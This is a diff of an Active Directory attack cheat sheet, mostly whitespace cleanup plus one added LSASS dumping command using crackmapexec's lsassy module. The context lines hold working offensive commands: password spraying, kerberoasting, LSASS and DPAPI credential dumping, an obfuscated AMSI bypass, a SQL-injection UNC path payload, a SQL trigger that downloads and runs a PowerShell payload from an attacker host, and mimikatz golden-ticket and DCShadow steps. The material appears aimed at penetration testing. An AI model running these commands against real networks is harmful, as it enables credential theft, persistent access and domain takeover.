@@ -53,7 +53,7 @@ it is the first version of this repo, many things will be added later, so stay t
   - [Tools](#tools)
   - [Powershell Components](#powershell-components)
     - [Powershell Tricks](#powershell-tricks)
-    - [PSWA Abusing](#pswa-abusing) 
+    - [PSWA Abusing](#pswa-abusing)
   - [Enumeration](#domain-enumeration)
     - [GPO enumeration](#gpo-enumeration)
     - [ACL and ACE enumeration](#acl-enumeration)
@@ -118,7 +118,7 @@ it is the first version of this repo, many things will be added later, so stay t
       - [MachineAccountQuota (MAQ) Exploitation](#machineaccountquota-maq-exploitation)
       - [Bad-Pwd-Count](#bad-pwd-count)
     - [Abusing IPv6 in AD](#abusing-ipv6-in-ad)
-      - [Rogue DHCP](#rogue-dhcp) 
+      - [Rogue DHCP](#rogue-dhcp)
       - [IOXIDResolver Interface Enumeration](#ioxidresolver-interface-enumeration)
     - [References](#references)
 
@@ -150,13 +150,13 @@ powerview is a script from powersploit that allow enumeration of the AD architec
 
 ## Powershell Components
 
-### Powershell Tricks 
+### Powershell Tricks
 
 **PS-Session** :
 
 ```powershell
 #METHOD 1
-$c = New-PSSession -ComputerName 10.10.13.100 -Authentication Negociate -Credential $user 
+$c = New-PSSession -ComputerName 10.10.13.100 -Authentication Negociate -Credential $user
 Enter-PSSession -Credential $c -ComputerName 10.10.13.100
 
 # METHOD 2
@@ -241,8 +241,8 @@ Get-GPResultantSetOfPolicy -ReportType Html -Path C:\Users\Administrator\report.
 **Enumerate All ACEs**
 
 ```powershell
- Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID 
-$_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq 
+ Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID
+$_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq
 $("$env:UserDomain\$env:Username")) {$_}}
 ```
 
@@ -262,7 +262,7 @@ Get-DomainUser -Identity supportuser | select serviceprincipalname
 Get-ADUser -Identity supportuser -Properties ServicePrincipalName | select ServicePrincipalName
 ```
 
-### LDAP Enumeration 
+### LDAP Enumeration
 ```powershell
 ldapsearch -x -h 10.10.10.x -p 389 -s base namingcontexts
 ldapsearch -h 10.10.10.x -p 389 -x -b "dc=boxname,dc=local"
@@ -274,9 +274,9 @@ ldapsearch -h 10.10.10.161 -p 389 -x -b "dc=box,dc=local" | grep "service"
 
 *Enumeration with ldapsearch as authenticated user*
 ```powershell
-ldapsearch -x -h ldap.megacorp.corp -w '$pass'     
+ldapsearch -x -h ldap.megacorp.corp -w '$pass'
 ldapsearch -x -h 10.10.131.164 -p 389 -b "dc=megacorp,dc=corp" -D 'john@megacorp.corp' -w 'vs2k6!'
-ldapsearch -D "cn=binduser,ou=users,dc=megacorp,dc=corp" -w 'J~42%W?]g' -s base namingcontexts 
+ldapsearch -D "cn=binduser,ou=users,dc=megacorp,dc=corp" -w 'J~42%W?]g' -s base namingcontexts
 ldapsearch -D "cn=binduser,ou=users,dc=megacorp,dc=corp" -w 'J~42%W?]g' -b 'dc=megacorp'
 ```
 *Enumeration with ldapdomaindump (authenticated) with nice output*
@@ -290,7 +290,7 @@ nmap -n -sV --script "ldap*" -p 389 10.10.10.x
 nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='MEGACORP.CORP',userdb=/usr/share/wordlists/seclists/Usernames/Names/names.txt 10.10.13.100
 ```
 
-### SMB Enumeration 
+### SMB Enumeration
 
 *enumeration with crackmapexec as unauthenticated*
 ```bash
@@ -299,7 +299,7 @@ crackmapexec smb 10.10.10.x --pass-pol -u '' -p ''
 *enumeration with crackmapexec (authenticated)*
 ```powershell
 crackmapexec smb 10.10.11.129 --pass-pol -u usernames.txt -p $pass --continue-on-sucess
-crackmapexec smb 10.10.11.129 --pass-pol -u xlsx_users -p $pass --continue-on-sucess      
+crackmapexec smb 10.10.11.129 --pass-pol -u xlsx_users -p $pass --continue-on-sucess
 ```
 
 *enumeration with kerbrute, against Kerberos pre-auth bruteforcing:*
@@ -307,7 +307,7 @@ crackmapexec smb 10.10.11.129 --pass-pol -u xlsx_users -p $pass --continue-on-su
 /opt/kerbrute/dist/kerbrute_linux_amd64 userenum -d megacorp.local --dc 10.10.13.100 -o kerbrute.out users.txt
 /opt/kerbrute/dist/kerbrute_linux_amd64 userenum -d megacorp.htb --dc 10.10.13.100 -o kerbrute.out users.lst --downgrade
 ```
-> by default, kerbrute uses the most secure mode (18 = sha1) to pull some hash. Using the downgrade option we can pull the deprecaded encryption type version (23 = rc4hmac). Or use getNPusers to get some hash instead, it's safer! 
+> by default, kerbrute uses the most secure mode (18 = sha1) to pull some hash. Using the downgrade option we can pull the deprecaded encryption type version (23 = rc4hmac). Or use getNPusers to get some hash instead, it's safer!
 
 *provide a password or a list of passwords to test against users*
 ```bash
@@ -317,7 +317,7 @@ crackmapexec smb 10.10.13.100 --pass-pol -u users.lst -p password_list
 ```bash
 crackmapexec smb 10.10.13.100 -u users.txt -p $pass --users | tee userlist.txt
 ```
-### Password Spraying on the domain 
+### Password Spraying on the domain
 ```bash
 /opt/kerbrute/dist/kerbrute_linux_amd64 passwordspray -d MEGACORP.CORP --dc 10.10.13.100 users.lst '$pass'
 ```
@@ -333,7 +333,7 @@ sudo bloodhound
 ```
 
 
-## RID Cycling 
+## RID Cycling
 
 *Global Structure :*
 ```
@@ -372,7 +372,7 @@ the value "20000" in lookupsid is to indicate how many RID will be tested
 ```powershell
 # Show all tokens
 Invoke-TokenManipulation -ShowAll
-# show usable tokens 
+# show usable tokens
 Invoke-TokenManipulation -Enumerate
 ```
 *Start a new process with the token of a user*
@@ -426,7 +426,7 @@ crackmapexec ldap $target -u $user -p $password --kerberoasting kerberoastable.t
 
 ```bash
 # using JTR :
-john --format=krb5tgs spn.txt --wordlist=wordlist.txt 
+john --format=krb5tgs spn.txt --wordlist=wordlist.txt
 # using hashcat :
 hashcat -m 13100 -a 0 spn.txt wordlist.txt --force
 ```
@@ -457,7 +457,7 @@ Get-NetGroupMember -GroupName "DNSAdmins"
 Get-ADGroupMember -Identity DNSAdmins
 ```
 
-*This attack consists of injecting a malicious arbitrary DLL and restarting the dns.exe service, 
+*This attack consists of injecting a malicious arbitrary DLL and restarting the dns.exe service,
 since the DC serves as a DNS service, we can elevate our privileges to a DA.*
 
 > DLL File :
@@ -510,6 +510,11 @@ impacket-wmiexec -k -no-pass administrator@10.10.10.248
 ## Credentials Dumping
 
 ### LSASS Dumping
+
+```powershell
+cme <protocol> <ip> -u <user> -p <pass> -M lsassy
+```
+- https://github.com/Hackndo/lsassy
 
 ```powershell
 procdump --accepteula -ma lsass lsass.dmp
@@ -567,7 +572,7 @@ vssadmin delete shadows /shadow=$ShadowCopyId
 ```bash
 dpapi.py backupkeys -t $domain/$user:$password@$target
 ```
-> Decrypt DPAPI MK 
+> Decrypt DPAPI MK
 ```bash
 # Decrypt DPAPI MK using BK
 dpapi.py masterkey -file "/path/to/masterkey" -pvk "/path/to/backup_key.pvk"
@@ -640,10 +645,10 @@ HKU\Software\Classes
 ### Read GMSA Password
 
 ```powershell
-$user = 'USER' 
-$gmsa = Get-ADServiceAccount -Identity $user -Properties 'msDS-ManagedPassword' 
-$blob = $gmsa.'msDS-ManagedPassword' 
-$mp = ConvertFrom-ADManagedPasswordBlob $blob 
+$user = 'USER'
+$gmsa = Get-ADServiceAccount -Identity $user -Properties 'msDS-ManagedPassword'
+$blob = $gmsa.'msDS-ManagedPassword'
+$mp = ConvertFrom-ADManagedPasswordBlob $blob
 $cred = New-Object System.Management.Automation.PSCredential $user, $mp.SecureCurrentPassword
 ````
 
@@ -693,9 +698,9 @@ hashcat -m 5600 --force -a 0 hash.txt wordlist.txt
 
 note : some Hash Type in hashcat depend of the **etype**
 
-## Bruteforce AD Password 
+## Bruteforce AD Password
 
-### Custom Username and Password wordlist 
+### Custom Username and Password wordlist
 
 default password list (pwd_list) :
 `
@@ -703,7 +708,7 @@ Autumn
 Spring
 Winter
 Summer
-` 
+`
 create passwords using bash & hashcat :
 ```bash
 for i in $(cat pwd_list); do echo $i, echo ${i}\!; echo ${i}2019; echo ${i}2020 ;done > pwds
@@ -723,7 +728,7 @@ create custom usernames using username-anarchy :
 ```bash
 ./username-anarchy --input-file users.list --select-format first,first.last,f.last,flast > users2.list
 ```
-  
+
 
 ## Pivoting
 
@@ -800,7 +805,7 @@ PS > net use x: \\TSCLIENT\X
 
 create a server with SSFD.exe
 ```powershell
-PS > ssfd.exe -p 8080 
+PS > ssfd.exe -p 8080
 ```
 *Redirect SSF port with DVC server:*
 ```powershell
@@ -817,7 +822,7 @@ PS > ./UDVC-Server.exe -c -p 8080 -i 127.0.0.1
 ```powershell
 PS > ssf.exe -D 9090 -p 31337 127.0.0.1
 ```
-  
+
 
 ## Persistence
 
@@ -850,7 +855,7 @@ Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose
 
 **list all groups to which the user belongs and has explicit access rights**
 ```powershell
-Get-DomainGroup | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID 
+Get-DomainGroup | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID
 $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
 ```
 
@@ -860,7 +865,7 @@ net group Administrator aker /add /domain
 
 ## Enhanced Security Bypass
 
-### AntiMalware Scan Interface 
+### AntiMalware Scan Interface
 
 ```powershell
 sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
@@ -869,7 +874,7 @@ patching AMSI from Powershell6 :
 ```powershell
 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('s_amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 ```
-  
+
 ### ConstrainLanguageMode
 
 Bypass CLM using **runspace**:
@@ -937,7 +942,7 @@ mimikatz # !-
 you can try obfuscation techniques on this command. To learn more about ETW see my course [here](https://github.com/RistBS/Active-directory-Cheat-sheet/blob/exploit-development/FR%20-%20ETW%20Bypassing.md)
 
 
-## MS Exchange 
+## MS Exchange
 
 ### OWA EWS and EAS Password Spraying
 
@@ -1025,7 +1030,7 @@ ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "powershell -exec b
 
 
 
-## MSSQL Server 
+## MSSQL Server
 
 ### UNC Path Injection
 
@@ -1037,7 +1042,7 @@ launch responder : `responder -I eth0`
 EXEC master..xp_dirtree \"\\\\192.168.1.33\\\\evil\";
 ```
 ```sql
-1'; use master; exec xp_dirtree '\\10.10.15.XX\SHARE';-- 
+1'; use master; exec xp_dirtree '\\10.10.15.XX\SHARE';--
 ```
 
 ### MC-SQLR Poisoning
@@ -1063,7 +1068,7 @@ CreateObject("ADODB.Connection").Open "Provider=SQLNCLI11;Data Source=DOESNOTEXI
 
 [ ❓ ] : **Triggers** are a stored procedure that automatically executes when an event occurs in the SQL Server.
 
-- Data Definition Language (DDL) – Executes on Create, Alter and Drop statements and some system stored procedures. 
+- Data Definition Language (DDL) – Executes on Create, Alter and Drop statements and some system stored procedures.
 - Data Manipulation Language (DML) – Executes on Insert, Update and Delete statements.
 - Logon Triggers – Executes on a user logon.
 
@@ -1100,7 +1105,7 @@ GO
 ```sql
 CREATE Trigger [persistence_ddl_1]
 ON ALL Server
-FOR DDL_LOGIN_EVENTS 
+FOR DDL_LOGIN_EVENTS
 AS
 EXEC master..xp_cmdshell 'powershell -C "iex (new-object System.Net.WebClient).DownloadString('http://$ip_attacker/payload.ps1')"
 GO
@@ -1119,7 +1124,7 @@ END;
 ```
 
 
-## Forest Persistence 
+## Forest Persistence
 
 ### DCShadow
 
@@ -1144,7 +1149,7 @@ mimikatz # sekurlsa::pth /user:Administrator /domain:$domain /ntlm:$admin_hash /
 mimikatz # lsadump::dcshadow /push
 ```
 
-## Cross Forest Attacks 
+## Cross Forest Attacks
 
 ### Trust Tickets
 
@@ -1169,7 +1174,7 @@ kirbikator.exe lsa .\CIFS.$domain.kirbi ls \\$domain\`c$
 ```
 
 
-### Using KRBTGT hash 
+### Using KRBTGT hash
 
 ```powershell
 Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
@@ -1177,8 +1182,8 @@ Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:domaine.
 
 Invoke-Mimikatz -Command '"kerberos::ptt C:\path\krb_tgt.kirbi
 ```
- 
- 
+
+
 ## Azure Active Directory
 
 ### AZ User Enumeration
@@ -1319,11 +1324,11 @@ PS AADInternals> New-AADIntUserPRTToken -RefreshToken $PRT -SessionKey $SKey –
 secretsdump -outputfile hashes $domain/$msol_svc_acc:$msol_pwd@$ip
 ```
 
-## Miscs 
+## Miscs
 
-### Domain Level Attribute 
+### Domain Level Attribute
 
-#### MachineAccountQuota (MAQ) Exploitation 
+#### MachineAccountQuota (MAQ) Exploitation
 
 use crackmapexec (CME) with maq module :
 
@@ -1336,7 +1341,7 @@ LDAP        10.10.13.100       389    dc1       Guest      badpwdcount: 0 pwdLas
 ```
 
 
-### Abusing IPv6 in AD 
+### Abusing IPv6 in AD
 
 sending ICMPv6 packet to the target using ping6 :
 
@@ -1358,7 +1363,7 @@ you can replace AF_INET value to AF_INET6 from socket python lib :
 sed -i "s/AF_INET/AF_INET6/g" script.py
 ```
 
-#### Rogue DHCP 
+#### Rogue DHCP
 
 `mitm6 -i eth0 -d 'domain.job.local'`
 
@@ -1386,7 +1391,7 @@ for bind in binding:
 ```
 
 
-## References 
+## References
 
 - https://tools.thehacker.recipes/mimikatz/modules/sekurlsa/cloudap
 - https://blog.netspi.com/maintaining-persistence-via-sql-server-part-2-triggers/
